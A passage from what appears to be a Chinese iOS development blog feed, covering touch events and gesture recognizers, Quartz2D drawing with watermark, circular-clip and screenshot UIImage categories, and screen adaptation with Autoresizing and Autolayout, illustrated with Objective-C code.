触摸结束前，某个系统事件(例如电话呼入)会打断触摸过程，系统会自动调用view的下面方法- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event// 提示：touches中存放的都是UITouch对象 UITouch 当用户用一根触摸屏幕时，会创建一个与手指相关联的UITouch对象： 一根手指对应一个UITouch对象 UITouch的作用： 保存着跟手指相关的信息，比如触摸的位置、时间、阶段 当手指移动时，系统会更新同一个UITouch对象，使之能够一直保存该手指在的触摸位置 当手指离开屏幕时，系统会销毁相应的UITouch对象 提示：iPhone开发中，要避免使用双击事件！ UITouch的属性1234567891011121314// 触摸产生时所处的窗口@property(nonatomic,readonly,retain) UIWindow *window;// 触摸产生时所处的视图@property(nonatomic,readonly,retain) UIView *view;// 短时间内点按屏幕的次数，可以根据tapCount判断单击、双击或更多的点击@property(nonatomic,readonly) NSUInteger tapCount;// 记录了触摸事件产生或变化时的时间，单位是秒@property(nonatomic,readonly) NSTimeInterval timestamp;// 当前触摸事件所处的状态@property(nonatomic,readonly) UITouchPhase phase; UITouch的方法1234567- (CGPoint)locationInView:(UIView *)view;// 返回值表示触摸在view上的位置// 这里返回的位置是针对view的坐标系的（以view的左上角为原点(0, 0)）// 调用时传入的view参数为nil的话，返回的是触摸点在UIWindow的位置- (CGPoint)previousLocationInView:(UIView *)view;// 该方法记录了前一个触摸点的位置 UIEvent 每产生一个事件，就会产生一个UIEvent对象 UIEvent：称为事件对象，记录事件产生的时刻和类型 123456789// 常见属性// 事件类型@property(nonatomic,readonly) UIEventType type;@property(nonatomic,readonly) UIEventSubtype subtype;// 事件产生的时间@property(nonatomic,readonly) NSTimeInterval timestamp;// UIEvent还提供了相应的方法可以获得在某个view上面的触摸对象（UITouch） touches和event参数 一次完整的触摸过程，会经历3个状态： 1234触摸开始：- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event触摸移动：- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event触摸结束：- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event触摸取消（可能会经历）：- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event 4个触摸事件处理方法中，都有NSSet *touches和UIEvent *event两个参数一次完整的触摸过程中，只会产生一个事件对象，4个触摸方法都是同一个event参数 如果两根手指同时触摸一个view，那么view只会调用一次touchesBegan:withEvent:方法，touches参数中装着2个UITouch对象 如果这两根手指一前一后分开触摸同一个view，那么view会分别调用2次touchesBegan:withEvent:方法，并且每次调用时的touches参数中只包含一个UITouch对象 根据touches中UITouch的个数可以判断出是单点触摸还是多点触摸 触摸事件的产生和传递 发生触摸事件后，系统会将该事件加入到一个由UIApplication管理的事件队列中 UIApplication会从事件队列中取出最前面的事件，并将事件分发下去以便处理，通常，先发送事件给应用程序的主窗口（keyWindow） 主窗口会在视图层次结构中找到一个最合适的视图来处理触摸事件，这也是整个事件处理过程的第一步 找到合适的视图控件后，就会调用视图控件的touches方法来作具体的事件处理 事件的产生和传递 触摸事件的传递是从父控件传递到子控件 123456点击了绿色的view：UIApplication -&gt; UIWindow -&gt; 白色 -&gt; 绿色点击了蓝色的view：UIApplication -&gt; UIWindow -&gt; 白色 -&gt; 橙色 -&gt; 蓝色点击了黄色的view：UIApplication -&gt; UIWindow -&gt; 白色 -&gt; 橙色 -&gt; 蓝色 -&gt; 黄色 注意 如果父控件不能接收触摸事件，那么子控件就不可能接收到触摸事件 如何找到最合适的控件来处理事件？(步骤如下) 自己是否能接收触摸事件？ 触摸点是否在自己身上？ 从后往前遍历子控件，重复前面的两个步骤 如果没有符合条件的子控件，那么就自己最适合处理 注意: 从后往前遍历子控件–”后”是表示数组里最外面的,即是显示在最前面的控件.(比如subviews[0]即是最前面的–是UIWindow) UIView不接收触摸事件的三种情况 提示：UIImageView的userInteractionEnabled默认就是NO，因此UIImageView以及它的子控件默认是不能接收触摸事件的 12345678// 不接收用户交互userInteractionEnabled = NO// 隐藏hidden = YES// 透明alpha = 0.0 ~ 0.01 响应者链条 事件的处理过程(详细) 用户点击屏幕后产生的一个触摸事件，经过一些列的传递过程后，会找到最合适的视图控件来处理这个事件 找到最合适的视图控件后，就会调用控件的touches方法来作具体的事件处理 这些touches方法的默认做法是将事件顺着响应者链条向上传递，将事件交给上一个响应者进行处理 响应者链条示意图&gt; 响应者链的事件传递过程 如果view的控制器存在，就传递给控制器；如果控制器不存在，则将其传递给它的父视图 在视图层次结构的最顶级视图，如果也不能处理收到的事件或消息，则其将事件或消息传递给window对象进行处理 如果window对象也不处理，则其将事件或消息传递给UIApplication对象 如果UIApplication也不能处理该事件或消息，则将其丢弃 手势识别 添加手势的方式 代码创建,添加监听(方法) storyboard的里面拖手势,添加监听(拖线(手势方法)) 监听触摸事件 如果想监听一个view上面的触摸事件，之前的做法是自定义一个view 实现view的touches方法，在方法内部实现具体处理代码 缺点 通过touches方法监听view触摸事件，有很明显的几个缺点 必须得自定义view 由于是在view内部的touches方法中监听触摸事件，因此默认情况下，无法让其他外界对象监听view的触摸事件，不容易区分用户的具体手势行为 iOS 3.2之后，苹果推出了手势识别功能（Gesture Recognizer），在触摸事件处理方面，大大简化了开发者的开发难度 UIGestureRecognizer 为了完成手势识别，必须借助于手势识别器–UIGestureRecognizer 利用UIGestureRecognizer，能轻松识别用户在某个view上面做的一些常见手势 UIGestureRecognizer是一个抽象类，定义了所有手势的基本行为，使用它的子类才能处理具体的手势 123456UITapGestureRecognizer(敲击)UIPinchGestureRecognizer(捏合，用于缩放)UIPanGestureRecognizer(拖拽)UISwipeGestureRecognizer(轻扫)UIRotationGestureRecognizer(旋转)UILongPressGestureRecognizer(长按) UITapGestureRecognizer 每一个手势识别器的用法都差不多，比如UITapGestureRecognizer的使用步骤如下 12345678910111213141516171819202122232425262728/** 手指敲击手势 */- (void)tap&#123; // 创建手势识别器点击对象 UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(didTap)]; // 点击次数 tap.numberOfTapsRequired = 2; // 点击手指数(需要几根手指操作) tap.numberOfTouchesRequired = 1; // 设置代理 tap.delegate = self; [self.iconView addGestureRecognizer:tap];&#125;/** * 是否接收处理点击事件 */- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch&#123; CGPoint point = [touch locationInView:touch.view]; // 可以在这里面确定点击的范围(在哪个范围作出回应) if (point.x &lt;= self.iconView.frame.size.width * 0.5) &#123; // 控制图片只有一半点击有反应 return NO; &#125;else&#123; return YES; &#125;&#125; UILongPressGestureRecognizer1234567891011- (void)demo&#123; // 创建长按手势识别器 UILongPressGestureRecognizer *longPress = [[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(didLongPress)]; // 设置长按多久生效 longPress.minimumPressDuration = 2; // 设置长按的时候的生效的一个范围(在这个范围内才能执行) longPress.allowableMovement = 10; // 添加到图片 [self.iconView addGestureRecognizer:longPress];&#125; UISwipeGestureRecognizer12345678// 默认图片是不能交互的self.iconView.userInteractionEnabled = YES;// 创建轻扫手势识别器UISwipeGestureRecognizer *swip = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(didSwipe)];// 轻扫的方向(默认是从右边轻扫)swip.direction = UISwipeGestureRecognizerDirectionLeft;// 添加到图片[self.iconView addGestureRecognizer:swip]; UIRotationGestureRecognizer123456789101112131415- (void)rotationGesture&#123; // 创建旋转手势识别器 UIRotationGestureRecognizer *rotate = [[UIRotationGestureRecognizer alloc] initWithTarget:self action:@selector(didRotation:)]; rotate.delegate = self; [self.iconView addGestureRecognizer:rotate];&#125;- (void)didRotation:(UIRotationGestureRecognizer *)rotate&#123; // 旋转的角度和手势旋转的角度一样 self.iconView.transform = CGAffineTransformRotate(self.iconView.transform, rotate.rotation);#warning 这个很重要!!! rotate.rotation = 0; // 不把旋转角度清零的话 直接累加上去 旋转幅度非常大&#125; UIPinchGestureRecognizer12345678910111213141516171819- (void)pinchGesture&#123; // 创建捏合手势识别器 UIPinchGestureRecognizer *pinch = [[UIPinchGestureRecognizer alloc] initWithTarget:self action:@selector(didPinch:)]; pinch.delegate = self; // 添加 [self.iconView addGestureRecognizer:pinch];&#125;/** * 手指捏合后调用的方法 */- (void)didPinch:(UIPinchGestureRecognizer *)pinch&#123; // 缩放的倍数和手指捏合的倍数相同 self.iconView.transform = CGAffineTransformScale(self.iconView.transform, pinch.scale, pinch.scale);#warning 这个很重要!!! // 缩放倍数重置为1 pinch.scale = 1; // 这一步很重要 必须要写,不然图片缩放的倍数会累加 幅度很大!!!&#125; UIPanGestureRecognizer12345678910111213141516// 创建拖拽手势 UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(didPan:)]; [self.iconView addGestureRecognizer:pan];- (void)didPan:(UIPanGestureRecognizer *)pan&#123; // 拖拽的位置 CGPoint panPoint = [pan translationInView:pan.view]; // 图片的中心点 CGPoint center = self.iconView.center; // 图片移动的距离就等于拖拽的距离 center.x += panPoint.x; center.y += panPoint.y; // 重新赋值给图片的中心点 self.iconView.center = center; // 清空移动的距离 防止累加后移动幅度过大(一定要清空) [pan setTranslation:CGPointZero inView:pan.view];&#125; 手势识别的状态12345678910111213141516typedef NS_ENUM(NSInteger, UIGestureRecognizerState) &#123; // 没有触摸事件发生，所有手势识别的默认状态 UIGestureRecognizerStatePossible, // 一个手势已经开始但尚未改变或者完成时 UIGestureRecognizerStateBegan, // 手势状态改变 UIGestureRecognizerStateChanged, // 手势完成 UIGestureRecognizerStateEnded, // 手势取消，恢复至Possible状态 UIGestureRecognizerStateCancelled, // 手势失败，恢复至Possible状态 UIGestureRecognizerStateFailed, // 识别到手势识别 UIGestureRecognizerStateRecognized = UIGestureRecognizerStateEnded&#125;; 手势的注意点 手势默认不能一次添加多个手势,一次添加多个手势只能识别一个(最后添加那个手势),但是可以创建多个手势,这样才能识别多个手势. Simultaneously (同时地,同步地) 1234567/** * 默认一次只能执行一个手势,设置这个可以一次执行多个手势操作 */- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer&#123; return YES;&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Event</tag>
        <tag>Recognizer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之Quartz2D入门]]></title>
    <url>%2Farchives%2F434e49e7.html</url>
    <content type="text"><![CDATA[宣室求贤访逐臣，贾生才调更无伦。可怜夜半虚前席，不问苍生问鬼神。 李商隐 《贾生》 基本介绍 Quartz 2D是一个二维绘图引擎，同时支持iOS和Mac系统 Quartz 2D能完成的工作 绘制图形 : 线条\三角形\矩形\圆\弧等 绘制文字 绘制\生成图片(图像) 读取\生成PDF 截图\裁剪图片 自定义UI控件 … … drawRect:方法的使用 常见图形的绘制：线条、多边形、圆 绘图状态的设置：文字颜色、线宽等 图形上下文状态的保存与恢复（图形上下文栈） 图片裁剪 截图 图形上下文 图形上下文（GraphicsContext）：是一个CGContextRef类型的数据 图形上下文的作用： 保存绘图信息、绘图状态 决定绘制的输出目标（绘制到什么地方去？）（输出目标可以是PDF文件、Bitmap或者显示器的窗口上） 相同的一套绘图序列，指定不同的GraphicsContext，就可将相同的图像绘制到不同的目标上 Quartz2D提供了以下几种类型的Graphics Context： 12345Bitmap Graphics ContextPDF Graphics ContextWindow Graphics ContextLayer Graphics ContextPrinter Graphics Context 如何利用Quartz2D自定义view？（自定义UI控件） 如何利用Quartz2D绘制东西到view上？ 首先，得有图形上下文，因为它能保存绘图信息，并且决定着绘制到什么地方去 其次，那个图形上下文必须跟view相关联，才能将内容绘制到view上面 为什么要实现drawRect:方法才能绘图到view上？ 因为在drawRect:方法中才能取得跟view相关联的图形上下文 drawRect:方法在什么时候被调用？ 当view第一次显示到屏幕上时（被加到UIWindow上显示出来）调用view的setNeedsDisplay或者setNeedsDisplayInRect:时 注意点 Quartz2D的API是纯C语言的 Quartz2D的API来自于Core Graphics框架 数据类型和函数基本都以CG作为前缀 1234CGContextRefCGPathRefCGContextStrokePath(ctx);…… 常用属性方法 drawRect:中取得的上下文 在drawRect:方法中取得上下文后，就可以绘制东西到view上 View内部有个layer（图层）属性，drawRect:方法中取得的是一个Layer GraphicsContext，因此，绘制的东西其实是绘制到view的layer上去了 View之所以能显示东西，完全是因为它内部的layer 自定义view的步骤 新建一个类，继承自UIView 实现- (void)drawRect:(CGRect)rect方法，然后在这个方法中 取得跟当前view相关联的图形上下文 绘制相应的图形内容 利用图形上下文将绘制的所有内容渲染显示到view上面 Quartz2D绘图1234567891011121314// 这个方法只会在第一次加载的时候调用 不能的手动调用- (void)drawRect:(CGRect)rect&#123; // 1.获取上下文 CGContextRef ctx = UIGraphicsGetCurrentContext(); // 2.画圆 CGContextAddArc(ctx, 125, 125, self.radius, 0, M_PI * 2, 0); [[UIColor redColor] set]; // 设置颜色 // 3.渲染 CGContextFillPath(ctx);&#125; 重绘实现简单动画 CADisplayLink定时器 如果每隔一段时间重绘,一般不会使用NSTimer 每次屏幕刷新的时候才会触发,每秒屏幕刷新60次,即1秒触发60次 每次刷新的时候就重绘一次 setNeedsDisplay:重绘,给当前控件绑定一个刷新的标识,每次屏幕刷新其实就是重绘 每次屏幕自动刷新60次,每次刷新的时候只会把当前需要刷新的view重绘 12// 重绘(会删除上一次的绘制信息) [self setNeedsDisplay]; 12345678910111213141516171819202122232425- (void)awakeFromNib&#123;// 添加定时器(适合时间间隔比较小得情况) 重绘实现动画CADisplayLink *link = [CADisplayLink displayLinkWithTarget:self selector:@selector(setNeedsDisplay)];// 添加到主运行循环,才会触发这个定时器[link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];&#125;- (void)drawRect:(CGRect)rect&#123; self.dogY += 7; self.dogY1 += 5; if (self.dogY &gt; rect.size.height) &#123; self.dogY = -128; self.dogY1 = -128; &#125; // 画dog UIImage *dog = [UIImage imageNamed:@"dog"]; [dog drawAtPoint:CGPointMake(50, self.dogY)]; // 画dog1 UIImage *dog1 = [UIImage imageNamed:@"dog1"]; [dog1 drawAtPoint:CGPointMake(150, self.dogY1)];&#125; 常用拼接路径的函数123456789101112131415// 新建一个起点void CGContextMoveToPoint(CGContextRef c, CGFloat x, CGFloat y)// 添加新的线段到某个点void CGContextAddLineToPoint(CGContextRef c, CGFloat x, CGFloat y)// 添加一个矩形void CGContextAddRect(CGContextRef c, CGRect rect)// 添加一个椭圆void CGContextAddEllipseInRect(CGContextRef context, CGRect rect)// 添加一个圆弧void CGContextAddArc(CGContextRef c, CGFloat x, CGFloat y, CGFloat radius, CGFloat startAngle, CGFloat endAngle, int clockwise) 常用绘制路径的函数12345678910// Mode参数决定绘制的模式void CGContextDrawPath(CGContextRef c, CGPathDrawingMode mode)// 绘制空心路径void CGContextStrokePath(CGContextRef c)// 绘制实心路径void CGContextFillPath(CGContextRef c)提示：一般以CGContextDraw、CGContextStroke、CGContextFill开头的函数，都是用来绘制路径的 图形上下文栈的操作12345// 将当前的上下文copy一份,保存到栈顶(那个栈叫做”图形上下文栈”)void CGContextSaveGState(CGContextRef c)// 将栈顶的上下文出栈,替换掉当前的上下文void CGContextRestoreGState(CGContextRef c) 矩阵操作12345678910// 利用矩阵操作，能让绘制到上下文中的所有路径一起发生变化// 缩放void CGContextScaleCTM(CGContextRef c, CGFloat sx, CGFloat sy)// 旋转void CGContextRotateCTM(CGContextRef c, CGFloat angle)// 平移void CGContextTranslateCTM(CGContextRef c, CGFloat tx, CGFloat ty) 图片水印 有时候，在手机客户端app中也需要用到水印技术 比如，用户拍完照片后，可以在照片上打个水印，标识这个图片是属于哪个用户的 实现方式：利用Quartz2D，将水印（文字、LOGO）画到图片的右下角 核心代码 12345678开启一个基于位图的图形上下文void UIGraphicsBeginImageContextWithOptions(CGSize size, BOOL opaque, CGFloat scale)从上下文中取得图片（UIImage）UIImage* UIGraphicsGetImageFromCurrentImageContext();结束基于位图的图形上下文void UIGraphicsEndImageContext(); 图片裁剪 有时候需要把一张普通的图片刻意裁剪成圆形 123// 核心代码void CGContextClip(CGContextRef c)// 将当前上下所绘制的路径裁剪出来（超出这个裁剪区域的都不能显示） 屏幕截图 有时候需要截取屏幕上的某一块内容： 123 // 核心代码- (void)renderInContext:(CGContextRef)ctx;调用某个view的layer的renderInContext:方法即可 贝塞尔曲线应用 矩形 123UIBezierPath *path = [UIBezierPath bezierPathWithRoundedRect:CGRectMake(10, 10, 200, 200) cornerRadius:100];[path stroke]; 椭圆 123UIBezierPath *path = [UIBezierPath bezierPathWithOvalInRect:CGRectMake(10, 10, 200, 200)];[path stroke]; 圆弧 12345678910// center:圆心// radius:半径// startAngle:起始角度// endAngle:结束角度// clockwise: YES:顺时针 NO:逆时针CGPoint center = CGPointMake(rect.size.width * 0.5, rect.size.height * 0.5);CGFloat radius = rect.size.width * 0.5 * 0.5;UIBezierPath *path = [UIBezierPath bezierPathWithArcCenter:center radius:radius startAngle:0 endAngle:M_PI clockwise:YES];[path stroke]; 注意点绘制图片的注意点123456789101112131415161718192021// 绘制图片UIImage *image = [UIImage imageNamed:@"阿狸头像"];// drawAtPoint:默认绘制的图片跟图片本身一样[image drawAtPoint:CGPointZero];// drawInRect:默认绘制的图片跟控件一样,拉伸跟控件一样大[image drawInRect:rect];// 设置裁剪区域的代码必须要在绘制之前// 设置裁剪区域,超出裁剪区域的部分会被裁剪掉UIRectClip(CGRectMake(0, 0, 50, 50));// Pattern:平铺[image drawAsPatternInRect:rect];// 快速的填充一个矩形UIRectFill(CGRectMake(0, 0, 50, 50)); // 超出控件的部分会被裁剪掉 // 绘图的时候,绘制的内容不能超过当前控件 绘制文字的注意点123456789101112131415161718192021222324252627282930// 文字NSString *str = @"hello world hello world hello world";// Attributes:可以给文字添加属性,富文本,字体,颜色,空心,阴影...// 用一个字典去描述文本属性NSMutableDictionary *strAttr = [NSMutableDictionary dictionary];// 设置字典,字典内容 是 一个key对应一个value// 字体strAttr[NSFontAttributeName] = [UIFont systemFontOfSize:50];// 颜色strAttr[NSForegroundColorAttributeName] = [UIColor redColor];// 描边strAttr[NSStrokeWidthAttributeName] = @1;strAttr[NSStrokeColorAttributeName] = [UIColor greenColor];// 阴影NSShadow *shadow = [[NSShadow alloc] init];shadow.shadowOffset = CGSizeMake(10, 10);shadow.shadowColor = [UIColor yellowColor];shadow.shadowBlurRadius = 5;strAttr[NSShadowAttributeName] = shadow;// drawAtPoint不会自动换行// [str drawAtPoint:CGPointZero withAttributes:strAttr];// drawInRect可以自动换行[str drawInRect:self.bounds withAttributes:strAttr]; 内存管理 使用含有“Create”或“Copy”的函数创建的对象，使用完后必须释放，否则将导致内存泄露 使用不含有“Create”或“Copy”的函数获取的对象，则不需要释放 如果retain了一个对象，不再使用时，需要将其release掉 可以使用Quartz 2D的函数来指定retain和release一个对象。例如，如果创建了一个CGColorSpace对象，则使用函数CGColorSpaceRetain和CGColorSpaceRelease来retain和`release对象。 也可以使用Core Foundation的CFRetain和CFRelease`。注意不能传递NULL值给这些函数 123456789101112131415161718192021222324252627282930313233343536// Create\copy\retain ---&gt; release (出现这些关键字就需要手动管理内存)- (void)drawRect:(CGRect)rect&#123; // (调用oc的方法的时候不需要获取上下文) CGContextRef ctx = UIGraphicsGetCurrentContext(); // 1.先创建一个路径 CGMutablePathRef linePath = CGPathCreateMutable(); // 2.拼接路径 CGPathMoveToPoint(linePath, NULL, 0, 0); CGPathAddLineToPoint(linePath, NULL, 100, 100); // 3.添加路径到上下文 CGContextAddPath(ctx, linePath); CGMutablePathRef circlePath = CGPathCreateMutable(); CGPathAddArc(circlePath, NULL, 150, 150, 50, 0, M_PI * 2, 0); CGContextAddPath(ctx, circlePath); // 4.渲染 CGContextStrokePath(ctx); // 路径的内存管理 CGPathRelease(linePath); CGPathRelease(circlePath); // 颜色空间的内存管路 CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB(); CGColorSpaceRelease(cs); // 也可以统一使用这个管理内存// CFRelease(linePath);// CFRelease(circlePath);// CFRelease(cs);&#125; 给UIImage添加分类添加水印分类的.h文件12345#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSWaterMark)+ (instancetype)waterMarkImgaeWithBg:(NSString *)bg water:(NSString *)logo;@end 分类的.m文件1234567891011121314151617181920212223242526272829303132333435363738#import "UIImage+XSWaterMark.h"@implementation UIImage (XSWaterMark)+ (instancetype)waterMarkImgaeWithBg:(NSString *)bg water:(NSString *)logo&#123; // 1.创建背景图片 UIImage *bgImage = [UIImage imageNamed:bg]; // 2.开启(创建)基于位图的上下文 // 上下文 : 基于位图(bitmap) , 所有的东西需要绘制到一张新的图片上去 // size : 新图片的尺寸 // BOOL opaque : Yes 是不透明 NO表示透明(一般都用不透明) scale:一般不用缩放 0.0 // 这行代码过后.就相当于常见一张新的bitmap,也就是新的UIImage对象 UIGraphicsBeginImageContextWithOptions(bgImage.size, NO, 0.0); // 3.画出背景图片到上下文中 [bgImage drawInRect:CGRectMake(0, 0, bgImage.size.width, bgImage.size.height)]; // 4.创建logo图片 画logo图片到上下文中去 UIImage *logoImage = [UIImage imageNamed:logo]; CGFloat margin = 5; // logo和边框的间隙 CGFloat scale = 0.5; CGFloat logoW = logoImage.size.width * scale; CGFloat logoH = logoImage.size.height * scale; CGFloat logoX = bgImage.size.width - logoW + margin; CGFloat logoY = bgImage.size.height - logoH - margin; [logoImage drawInRect:CGRectMake(logoX, logoY, logoW, logoH)]; // 5.获取上下文中生成的新的图片 UIImage *waterImage = UIGraphicsGetImageFromCurrentImageContext(); // 6.结束上下文 UIGraphicsEndImageContext(); return waterImage;&#125;@end 使用1234567891011121314151617181920212223242526272829303132#import "ViewController.h"#import "UIImage+XSWaterMark.h"@interface ViewController ()@property (weak, nonatomic) IBOutlet UIImageView *iconView;@end@implementation ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; // 1.返回水印图片 UIImage *waterImage = [UIImage waterMarkImgaeWithBg:@"bg" water:@"logo"]; // 2.显示图片到view中 self.iconView.image = waterImage; // 3.将图片压缩为二进制的数据信息 NSData *data = UIImagePNGRepresentation(waterImage); // 4.写入数据到沙盒document文件夹中 // 4.1.获取写入的沙盒文档路径 NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"new.png"]; // 4.2.写入数据 [data writeToFile:path atomically:YES]; // 打印沙盒的位置 // NSLog(@"%@",NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES));&#125; 圆形切图分类的.h文件123456#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSImageClipToCircle)+ (instancetype)clipImageWithName:(NSString *)name BorderWidth:(CGFloat)borderWidth borderColor:(UIColor *)color;@end 分类的.m文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#import "UIImage+XSImageClipToCircle.h"@implementation UIImage (XSImageClipToCircle)+ (instancetype)clipImageWithName:(NSString *)name BorderWidth:(CGFloat)borderWidth borderColor:(UIColor *)color&#123; // 加载原图 UIImage *oldImage = [UIImage imageNamed:name]; // 1.开启上下文// CGFloat border = 3; // 图片距离边框的边距 CGFloat imageW = oldImage.size.width + 2 * borderWidth; CGFloat imageH = oldImage.size.height + 2 * borderWidth; UIGraphicsBeginImageContextWithOptions(CGSizeMake(imageW, imageH), NO, 0.0); // 2.取得上下文 CGContextRef ctx = UIGraphicsGetCurrentContext(); // 3.画最外面的框的圆 [color set]; // 圆环颜色为白色 CGFloat bigCircleRadius = imageW * 0.5; CGFloat bigCircleX = bigCircleRadius; CGFloat bigCircleY = bigCircleRadius; CGContextAddArc(ctx, bigCircleX, bigCircleY, bigCircleRadius, 0, M_PI * 2, 0); CGContextFillPath(ctx); // 画出最外面的大圆 // 4.最里面的小圆(和大圆是同心圆) CGFloat smallCircleRadius = bigCircleRadius - borderWidth; CGFloat smallCircleX = bigCircleX; CGFloat smallCircleY = bigCircleY; CGContextAddArc(ctx, smallCircleX, smallCircleY, smallCircleRadius, 0, M_PI * 2, 0); // 4.1.裁剪 CGContextClip(ctx); // 5.画图片到小圆里 CGFloat clipImageX = borderWidth; CGFloat clipImageY = borderWidth; CGFloat clipImageW = oldImage.size.width; CGFloat clipImageH = oldImage.size.height; [oldImage drawInRect:CGRectMake(clipImageX, clipImageY, clipImageW, clipImageH)]; // 6.取得新的图片 UIImage *clipImage = UIGraphicsGetImageFromCurrentImageContext(); // 7.结束上下文 UIGraphicsEndImageContext(); return clipImage;&#125;@end 使用12345678910111213141516171819202122232425262728#import "ViewController.h"#import "UIImage+XSImageClipToCircle.h" @interface ViewController () @property (weak, nonatomic) IBOutlet UIImageView *iconView; @end @implementation ViewController - (void)viewDidLoad &#123; [super viewDidLoad]; // 1.返回裁剪的图片 UIImage *clipImage = [UIImage clipImageWithName:@"me" BorderWidth:2 borderColor:[UIColor whiteColor]]; // 2.显示图片 self.iconView.image = clipImage; // 3.新图片压缩为二进制数据 NSData *data = UIImagePNGRepresentation(clipImage); // 4.写入数据到document文件夹中 NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"clip.png"]; [data writeToFile:path atomically:YES];&#125; 截屏分类的.h文件1234567#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSCaptureScreen)+ (instancetype)captureWithView:(UIView *)view;@end 分类的.m文件123456789101112131415161718192021222324#import "UIImage+XSCaptureScreen.h"@implementation UIImage (XSCaptureScreen)+ (instancetype)captureWithView:(UIView *)view&#123; // 1.开启上下文(和控制器view一样尺寸) UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, 0.0); // 2.获取上下文 CGContextRef ctx = UIGraphicsGetCurrentContext(); // 3.将控制器view渲染到上下文中 [view.layer renderInContext:ctx]; // 4.获取新的图片 UIImage *captureImage = UIGraphicsGetImageFromCurrentImageContext(); // 5.结束上下文 UIGraphicsEndImageContext(); return captureImage;&#125;@end 使用1234567891011121314151617181920212223242526272829303132333435#import "ViewController.h"#import "UIImage+XSCaptureScreen.h"@interface ViewController ()@property (weak, nonatomic) IBOutlet UIView *cyanView;- (IBAction)CaptureBtnClick;@end@implementation ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; &#125;/** * 点击截屏调用的方法 */- (IBAction)CaptureBtnClick &#123; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; // 1.截图 UIImage *captureImage = [UIImage captureWithView:self.cyanView]; // 2.写入数据 NSData *data = UIImagePNGRepresentation(captureImage); NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"captureImage.png"]; [data writeToFile:path atomically:YES]; &#125;);&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Quartz2D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之了解屏幕适配]]></title>
    <url>%2Farchives%2F31ba9d29.html</url>
    <content type="text"><![CDATA[荷叶生时春恨生，荷叶枯时秋恨成。深知身在情长在，怅望江头江水声。 李商隐 《暮秋独游曲江》 屏幕适配屏幕类型 点和像素 屏幕分辨率 iPhone4之前 没有适配，不用适配 经常会出现坐标值写死的代码 123456789//#define ScreenW 320//#define ScreenH 480#define ScreenW [UIScreen mainScreen].bounds.size.width#define ScreenH [UIScreen mainScreen].bounds.size.height// 创建一个显示在屏幕右下角的按钮CGFloat buttonW = 100;CGFloat buttonH = 50;button.frame = CGRectMake(ScreenW - buttonW, ScreenH - buttonH, buttonW, buttonH); iPad出现以后 需要横竖屏适配 出现了一种方便的屏幕适配技术：Autoresizing 局限性：仅仅能解决子控件和父控件之间的相对关系问题 iOS6开始（Xcode4开始） 出现了一种新的屏幕适配技术：Autolayout 解决任何控件之间的相对关系问题 iOS8开始（Xcode6开始） 出现了一种新的屏幕适配技术：Sizeclass Autoresizing UIViewAutoresizingFlexibleLeftMargin = 1 &lt;&lt; 0, 距离父控件左边的间距是伸缩的 UIViewAutoresizingFlexibleRightMargin = 1 &lt;&lt; 2, 距离父控件右边的间距是伸缩的 UIViewAutoresizingFlexibleTopMargin = 1 &lt;&lt; 3, 距离父控件上边的间距是伸缩的 UIViewAutoresizingFlexibleBottomMargin = 1 &lt;&lt; 5 距离父控件下边的间距是伸缩的 UIViewAutoresizingFlexibleWidth = 1 &lt;&lt; 1, 宽度跟随父控件宽度进行伸缩 UIViewAutoresizingFlexibleHeight = 1 &lt;&lt; 4, 高度跟随父控件高度进行伸缩 Autolayout2个核心概念 约束 尺寸约束 width约束 height约束 位置约束 间距约束（上下左右间距） 参照 所添加的约束跟哪个控件有关（相对于哪个控件来说） 常见单词 Leading -&gt; Left -&gt; 左边 Trailing -&gt; Right -&gt; 右边 实现约束动画12345[UIView animateWithDuration:2.0 animations:^&#123; self.topCos.constant += 250; // layoutIfNeeded:强制更新控件(会更新当前控件和所有子控件) [self.view layoutIfNeeded]; &#125;]; 警告和错误 UILabel实现包裹内容 设置宽度约束为 &lt;= 固定值 设置位置约束 不用去设置高度约束 开发中能用到的小技巧 有时候也会约束某几个控件的位置和宽高在屏幕中的位置等间距不变 此时需要在这些控件中间添加占位控件并设置hidden属性为yes即可 青色的控件设置: 第一个青色控件自身的宽高以及和顶部或者底部的间隙 第二个青色控件和第一个顶部或者底部水平 宽高尺寸也相同 灰色的为占位控件 设置 : 左右间隙均为0 高度随便固定一个值 (宽度不要设置) 距离顶部或者底部的间隙 其他两个控件和第一个控件的顶或者底部对齐 宽度相同(高度随意) 